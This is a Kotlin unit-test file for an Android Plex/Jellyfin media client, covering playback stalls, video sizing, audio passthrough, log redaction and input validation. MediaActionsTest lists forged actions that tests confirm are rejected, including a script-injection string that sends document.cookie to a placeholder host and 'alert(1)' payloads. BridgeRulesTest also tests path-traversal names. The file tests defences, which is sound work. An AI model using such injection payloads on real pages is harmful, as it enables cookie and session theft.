package io.github.yanutros.plexr

import androidx.media3.common.C
import androidx.media3.common.MimeTypes
import androidx.media3.common.PlaybackException
import org.junit.Assert.assertArrayEquals
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

/** Règles du lecteur vidéo natif (PlaybackRules.kt), vérifiées sans appareil. */
class StallWatchTest {
  /** Appels toutes les 500 ms, comme le lecteur ; renvoie les évènements, avec l'heure de chacun. */
  private class Run(val watch: StallWatch = StallWatch()) {
    var now = 0L
    val events = mutableListOf<Pair<Long, StallWatch.Event>>()

    fun tick(position: Long, playing: Boolean = true, buffered: Long = position + 10_000) {
      watch.update(now, position, playing, buffered)?.let { events += now to it }
      now += 500
    }

    /** `ms` de lecture figée à `position`. */
    fun frozen(position: Long, ms: Long, playing: Boolean = true, buffered: Long = position + 10_000) {
      repeat((ms / 500).toInt()) { tick(position, playing, buffered) }
    }
  }

  @Test
  fun `une lecture qui avance n'est jamais figée`() {
    val r = Run()
    for (i in 0 until 100) r.tick(position = i * 500L)
    assertTrue(r.events.isEmpty())
    assertFalse(r.watch.stalled)
  }

  @Test
  fun `figée 5 s en lecture avec de l'avance, signalée une seule fois`() {
    val r = Run()
    r.frozen(position = 60_000, ms = 20_000)
    assertEquals(listOf(5_000L to StallWatch.Stalled(at = 60_000, frozenMs = 5_000)), r.events)
    assertTrue(r.watch.stalled)
  }

  @Test
  fun `pas avant 5 s`() {
    val r = Run()
    r.frozen(position = 60_000, ms = 5_000)
    assertTrue(r.events.isEmpty())
  }

  @Test
  fun `de petits écarts de position (300 ms au plus) comptent comme immobiles`() {
    val r = Run()
    for (i in 0 until 12) r.tick(position = 60_000 + (i % 2) * 300L)
    assertEquals(1, r.events.size)
    assertTrue(r.events[0].second is StallWatch.Stalled)
  }

  @Test
  fun `en pause, le temps ne compte pas, et la reprise repart de zéro`() {
    val r = Run()
    r.frozen(position = 60_000, ms = 30_000, playing = false)
    assertTrue(r.events.isEmpty())
    // Lecture relancée mais toujours immobile : 5 s comptées depuis la fin de la pause.
    r.frozen(position = 60_000, ms = 4_500)
    assertTrue(r.events.isEmpty())
    r.tick(position = 60_000)
    assertEquals(1, r.events.size)
  }

  @Test
  fun `une coupure réseau (moins de 2 s d'avance) n'est pas un blocage`() {
    val r = Run()
    r.frozen(position = 60_000, ms = 30_000, buffered = 61_500)
    assertTrue(r.events.isEmpty())
  }

  @Test
  fun `un petit pas en avant après le blocage, la lecture a repris`() {
    val r = Run()
    r.frozen(position = 60_000, ms = 8_000)
    r.tick(position = 60_500)
    // Figée de 0 à 8 s.
    assertEquals(8_000L to StallWatch.Resumed(at = 60_500, frozenMs = 8_000), r.events.last())
    assertFalse(r.watch.stalled)
  }

  @Test
  fun `un grand écart après le blocage est un saut, de nouveau surveillé`() {
    val r = Run()
    r.frozen(position = 60_000, ms = 6_000)
    r.tick(position = 70_000)
    assertEquals(StallWatch.Jumped(at = 70_000), r.events.last().second)
    assertFalse(r.watch.stalled)
    // Toujours figée après le saut : nouveau blocage 5 s plus tard.
    r.frozen(position = 70_000, ms = 5_500)
    assertEquals(StallWatch.Stalled(at = 70_000, frozenMs = 5_000), r.events.last().second)
  }

  @Test
  fun `un retour en arrière pendant le blocage est un saut`() {
    val r = Run()
    r.frozen(position = 60_000, ms = 6_000)
    r.tick(position = 50_000)
    assertEquals(StallWatch.Jumped(at = 50_000), r.events.last().second)
  }

  @Test
  fun `après une relance, la surveillance repart de zéro`() {
    val r = Run()
    r.frozen(position = 60_000, ms = 6_000)
    r.watch.reset()
    assertFalse(r.watch.stalled)
    r.frozen(position = 60_000, ms = 5_000)
    assertEquals(1, r.events.size)
    r.tick(position = 60_000)
    assertEquals(2, r.events.size)
  }
}

class PlaybackRulesTest {
  @Test
  fun `son envoyé tel quel, seulement en automatique, sans décodeur son ouvert ici`() {
    // Le cas du Dolby qui cale sur certaines TV : réglage automatique, aucun décodeur son, format connu.
    assertTrue(soundSentAsIs(passthroughOn = true, audioDecoded = false, audioMime = MimeTypes.AUDIO_AC3))
    assertFalse(soundSentAsIs(passthroughOn = true, audioDecoded = true, audioMime = MimeTypes.AUDIO_AC3))
    assertFalse(soundSentAsIs(passthroughOn = false, audioDecoded = false, audioMime = MimeTypes.AUDIO_AC3))
    assertFalse(soundSentAsIs(passthroughOn = true, audioDecoded = false, audioMime = null))
  }

  /** Taille arrondie au pixel près : le calcul passe par des nombres à virgule. */
  private fun assertSize(w: Int, h: Int, actual: Pair<Int, Int>?) {
    val (aw, ah) = actual ?: throw AssertionError("aucune taille")
    assertTrue("largeur $aw au lieu de $w", kotlin.math.abs(aw - w) <= 1)
    assertTrue("hauteur $ah au lieu de $h", kotlin.math.abs(ah - h) <= 1)
  }

  @Test
  fun `l'image garde son format, centrée dans l'écran`() {
    // 16:9 sur un écran 16:9 : tout l'écran.
    assertSize(1920, 1080, fitVideo(3840, 2160, 1f, 1920, 1080))
    // Film en 2.39:1 : bandes noires en haut et en bas.
    assertSize(1920, 803, fitVideo(1920, 803, 1f, 1920, 1080))
    assertSize(1920, 960, fitVideo(2048, 1024, 1f, 1920, 1080))
    // 4:3 : bandes noires sur les côtés.
    assertSize(1440, 1080, fitVideo(1024, 768, 1f, 1920, 1080))
    // Pixels rectangulaires (DVD 16:9, 720 × 576) : le format affiché compte, pas celui des pixels stockés.
    assertSize(1920, 1080, fitVideo(720, 576, 64f / 45f, 1920, 1080))
    // Téléphone en portrait : la largeur commande.
    assertSize(1080, 607, fitVideo(1920, 1080, 1f, 1080, 2400))
  }

  @Test
  fun `pas de taille tant que l'image ou l'écran n'en ont pas`() {
    assertNull(fitVideo(0, 0, 1f, 1920, 1080))
    assertNull(fitVideo(1920, 1080, 1f, 0, 0))
  }

  @Test
  fun `type des sous-titres externes d'après le codec`() {
    assertEquals(MimeTypes.TEXT_SSA, subtitleMime("ass"))
    assertEquals(MimeTypes.TEXT_SSA, subtitleMime("SSA"))
    assertEquals(MimeTypes.TEXT_VTT, subtitleMime("webvtt"))
    assertEquals(MimeTypes.TEXT_VTT, subtitleMime("vtt"))
    assertEquals(MimeTypes.APPLICATION_TTML, subtitleMime("dfxp"))
    assertEquals(MimeTypes.APPLICATION_SUBRIP, subtitleMime("srt"))
    assertEquals(MimeTypes.APPLICATION_SUBRIP, subtitleMime(""))
  }

  @Test
  fun `seules les erreurs de décodage demandent la conversion`() {
    assertTrue(isDecodingError(PlaybackException.ERROR_CODE_DECODER_INIT_FAILED))
    assertTrue(isDecodingError(PlaybackException.ERROR_CODE_DECODING_FORMAT_UNSUPPORTED))
    assertTrue(isDecodingError(PlaybackException.ERROR_CODE_PARSING_CONTAINER_UNSUPPORTED))
    assertFalse(isDecodingError(PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED))
    assertFalse(isDecodingError(PlaybackException.ERROR_CODE_PARSING_CONTAINER_MALFORMED))
    assertFalse(isDecodingError(PlaybackException.ERROR_CODE_UNSPECIFIED))
  }

  @Test
  fun `pistes numérotées comme dans mpv`() {
    assertEquals(TrackChoice.Off, TrackChoice.parse("no"))
    assertEquals(TrackChoice.At(0), TrackChoice.parse("1"))
    assertEquals(TrackChoice.At(2), TrackChoice.parse("3"))
    assertNull(TrackChoice.parse("0"))
    assertNull(TrackChoice.parse("-1"))
    assertNull(TrackChoice.parse("auto"))
    assertNull(TrackChoice.parse(""))
  }
}

class AudioMemoryTest {
  private val dolby = listOf(C.ENCODING_AC3, C.ENCODING_E_AC3)
  private val saved = dolby.joinToString(",")

  private fun choose(
    live: List<Int> = emptyList(),
    sinceBootMs: Long = 30_000,
    build: String = "systeme-1",
    savedBuild: String? = "systeme-1",
    savedEncodings: String? = saved,
  ) = AudioMemory.choose(live, liveChannels = 8, sinceBootMs, build, savedBuild, savedEncodings, savedChannels = 6)

  @Test
  fun `une vraie réponse de la sortie audio est gardée, et fait foi`() {
    assertEquals(AudioMemory.Remember(dolby, 8), choose(live = dolby))
    // Même juste après le démarrage, et même différente de celle gardée (barre de son changée).
    assertEquals(AudioMemory.Remember(listOf(C.ENCODING_DTS), 8), choose(live = listOf(C.ENCODING_DTS), sinceBootMs = 1_000))
  }

  @Test
  fun `réponse vide juste après le démarrage, la dernière valable est reprise`() {
    val choice = choose()
    assertTrue(choice is AudioMemory.Saved)
    choice as AudioMemory.Saved
    // Le son décodé ici reste possible (PCM), en plus des formats gardés.
    assertArrayEquals(intArrayOf(C.ENCODING_PCM_16BIT, C.ENCODING_AC3, C.ENCODING_E_AC3), choice.encodings)
    assertEquals(6, choice.channels)
    // Jusqu'à la fin de la fenêtre comprise.
    assertTrue(choose(sinceBootMs = AudioMemory.BOOT_WINDOW_MS) is AudioMemory.Saved)
  }

  @Test
  fun `réponse vide longtemps après le démarrage, elle fait foi`() {
    assertEquals(AudioMemory.Live, choose(sinceBootMs = AudioMemory.BOOT_WINDOW_MS + 1))
  }

  @Test
  fun `une mise à jour du système efface la mémoire`() {
    assertEquals(AudioMemory.Live, choose(build = "systeme-2"))
  }

  @Test
  fun `rien de gardé, la réponse du moment fait foi`() {
    assertEquals(AudioMemory.Live, choose(savedBuild = null, savedEncodings = null))
    assertEquals(AudioMemory.Live, choose(savedEncodings = null))
    assertEquals(AudioMemory.Live, choose(savedEncodings = ""))
  }
}

/** Commandes du service de musique : rien d'autre que les commandes de lecture ne part vers la page. */
class MediaActionsTest {
  @Test
  fun `les commandes de lecture passent`() {
    for (action in listOf("play", "pause", "next", "previous", "stop", "seek:0", "seek:93500")) {
      assertEquals(action, MediaActions.valid(action))
    }
    assertEquals("window.__plexrMedia && window.__plexrMedia('seek:93500')", MediaActions.script("seek:93500"))
  }

  @Test
  fun `une action forgée par une autre application est ignorée`() {
    val forged = listOf(
      "');fetch('https://exemple.invalid/'+document.cookie);('",
      "play');alert(1);('",
      "seek:abc",
      "seek:-5",
      "seek:1;alert(1)",
      "seek:99999999999999999999",
      "PLAY",
      "android.intent.action.MAIN",
      "",
    )
    for (action in forged) {
      assertNull(action, MediaActions.valid(action))
      assertNull(action, MediaActions.script(action))
    }
    assertNull(MediaActions.valid(null))
  }
}

/** Applications qui peuvent faire jouer la bibliothèque par le service de musique. */
class TrustedClientTest {
  private val allowed = listOf("com.google.android.projection.gearhead")
  private fun trusted(client: String?, uid: Int = 10123) = MediaActions.trusted(client, "io.github.yanutros.plexr", allowed, uid, 1000)

  @Test
  fun `Maku, Android Auto et le système sont reconnus`() {
    assertTrue(trusted("io.github.yanutros.plexr"))
    assertTrue(trusted("com.google.android.projection.gearhead"))
    assertTrue(trusted("android", uid = 1000))
  }

  @Test
  fun `une autre application ne fait rien jouer`() {
    assertFalse(trusted("com.exemple.autre"))
    assertFalse(trusted("io.github.yanutros.plexr.faux"))
    assertFalse(trusted(null))
    assertFalse(trusted(""))
  }
}

/** Ce que la page (ou une page d'un autre site affichée dans Maku) peut demander à l'appareil. */
class BridgeRulesTest {
  @Test
  fun `le nom d'une image partagée n'est jamais un chemin`() {
    assertEquals("maku-invitation", BridgeRules.shareName("maku-invitation"))
    for (name in listOf("../../files/x", "a/b", "a\\b", "..", "", "nom avec espace", "x".repeat(41), null)) {
      assertEquals(name, "maku", BridgeRules.shareName(name))
    }
  }

  @Test
  fun `seule une mise à jour téléchargée par Maku s'installe`() {
    val cache = java.io.File(System.getProperty("java.io.tmpdir"), "maku-test-cache-" + System.nanoTime())
    val updates = java.io.File(cache, "updates").apply { mkdirs() }
    try {
      assertTrue(BridgeRules.isUpdateApk(java.io.File(updates, "Maku_0.31.0_android.apk").path, cache))
      // Ailleurs dans le cache, hors du cache, en remontant d'un dossier, ou un autre type de fichier.
      assertFalse(BridgeRules.isUpdateApk(java.io.File(cache, "autre.apk").path, cache))
      assertFalse(BridgeRules.isUpdateApk(java.io.File(updates, "../autre.apk").path, cache))
      assertFalse(BridgeRules.isUpdateApk(java.io.File(updates, "sous/dossier.apk").path, cache))
      assertFalse(BridgeRules.isUpdateApk(java.io.File(System.getProperty("java.io.tmpdir"), "telecharge.apk").path, cache))
      assertFalse(BridgeRules.isUpdateApk(java.io.File(updates, "Maku.txt").path, cache))
      assertFalse(BridgeRules.isUpdateApk("", cache))
      assertFalse(BridgeRules.isUpdateApk(null, cache))
    } finally {
      cache.deleteRecursively()
    }
  }
}

/** Journal de diagnostic : rien de personnel n'y est écrit. */
class DiagCleanTest {
  private fun clean(text: String) = DiagClean.clean(text, listOf("monserveur.exemple"))

  @Test
  fun `adresses de serveur masquées, chemin gardé`() {
    assertEquals("Lecture de <serveur>/video/:/transcode/universal/start.m3u8", clean("Lecture de https://monserveur.exemple:32400/video/:/transcode/universal/start.m3u8?X-Plex-Token=abc123&session=9"))
    assertEquals("Unable to resolve host <serveur>", clean("Unable to resolve host monserveur.exemple"))
    assertEquals("Fichier <fichier> introuvable", clean("Fichier file:///data/user/0/app/files/offline/Un%20film.mkv introuvable"))
  }

  @Test
  fun `jetons masqués sous toutes leurs formes`() {
    for (line in listOf("api_key=abc123SECRET", "X-Plex-Token=abc123SECRET&x=1", "X-Plex-Token: abc123SECRET", "{\"AccessToken\":\"abc123SECRET\"}", "Authorization: abc123SECRET", "X-Emby-Token : 'abc123SECRET'")) {
      assertFalse(line, clean(line).contains("abc123SECRET"))
    }
  }

  @Test
  fun `adresses IP et identifiants masqués`() {
    assertEquals("Failed to connect to /<ip>:8096", clean("Failed to connect to /192.168.1.10:8096"))
    for (ip in listOf("2a01:e0a:1b2:c3d0:1234:5678:9abc:def0", "fe80::1c2d:3e4f:5a6b:7c8d", "2001:db8::1")) {
      val line = clean("Failed to connect to /$ip (port 8096)")
      assertFalse(line, line.contains(ip.take(9)))
      assertTrue(line, line.contains("<ip>"))
    }
    // Identifiant Jellyfin (32), UUID avec tirets, identifiant de machine Plex (40).
    for (id in listOf("0123456789abcdef0123456789abcdef", "01234567-89ab-cdef-0123-456789abcdef", "0123456789abcdef0123456789abcdef01234567")) {
      assertEquals("utilisateur <id> connecté", clean("utilisateur $id connecté"))
    }
  }

  @Test
  fun `ce qui n'est pas personnel reste lisible`() {
    // Une heure, une durée, une taille d'image ou un code d'erreur ne sont pas des adresses.
    for (line in listOf("Lecture commencée à 20:12:34", "position 1:02:03 sur 2:15:00", "image 3840x2160 à 23.976 i/s", "erreur 0x80000003", "décodeur c2.android.hevc.decoder", "Retour (item, sélection page : button.play) : page précédente")) {
      assertEquals(line, clean(line))
    }
  }
}

/** L'écran pendant une vidéo, et la mémoire tampon du lecteur. */
class ScreenAndBufferTest {
  @Test
  fun `l'écran reste allumé pendant la lecture et le chargement, pas en pause ni à la fin`() {
    assertTrue(keepsScreenOn(true, androidx.media3.common.Player.STATE_READY))
    assertTrue(keepsScreenOn(true, androidx.media3.common.Player.STATE_BUFFERING))
    // En pause : l'économiseur d'écran du téléviseur peut démarrer, le téléphone peut s'éteindre.
    assertFalse(keepsScreenOn(false, androidx.media3.common.Player.STATE_READY))
    assertFalse(keepsScreenOn(false, androidx.media3.common.Player.STATE_BUFFERING))
    assertFalse(keepsScreenOn(true, androidx.media3.common.Player.STATE_ENDED))
    assertFalse(keepsScreenOn(true, androidx.media3.common.Player.STATE_IDLE))
  }

  @Test
  fun `la mémoire tampon suit la mémoire accordée à Maku`() {
    val mb = { memoryClass: Int -> videoBufferBytes(memoryClass) / (1024 * 1024) }
    // Téléviseur à 192 Mo : moins de la moitié, au lieu des 144 Mo du réglage par défaut.
    assertEquals(86, mb(192))
    assertEquals(115, mb(256))
    // Beaucoup de mémoire : le réglage par défaut, jamais plus.
    assertEquals(DEFAULT_VIDEO_BUFFER_MB, mb(384))
    assertEquals(DEFAULT_VIDEO_BUFFER_MB, mb(512))
    // Très peu de mémoire : un minimum, pour ne pas hacher la lecture.
    assertEquals(MIN_VIDEO_BUFFER_MB, mb(48))
    assertEquals(57, mb(128))
    for (memoryClass in listOf(64, 96, 128, 192, 256, 320)) assertTrue("$memoryClass", mb(memoryClass) <= memoryClass / 2)
  }
}
